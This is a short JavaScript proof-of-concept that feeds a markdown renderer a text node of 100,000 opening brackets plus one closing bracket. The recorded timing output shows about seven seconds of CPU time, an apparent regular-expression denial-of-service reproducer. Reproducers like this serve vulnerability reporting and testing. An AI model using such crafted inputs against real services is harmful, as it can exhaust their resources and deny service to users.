const { render } = require("./markdown.js");

//Attack String :""+"["*100000+"]"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "[";
}
str += "]";

const node = {
  type: "text",
  text: str,
};
const nodes = [node];
var result = render(nodes, "");

// real    0m7.265s
// user    0m7.240s
// sys     0m0.010s

//将文件中的所有?.修改为了.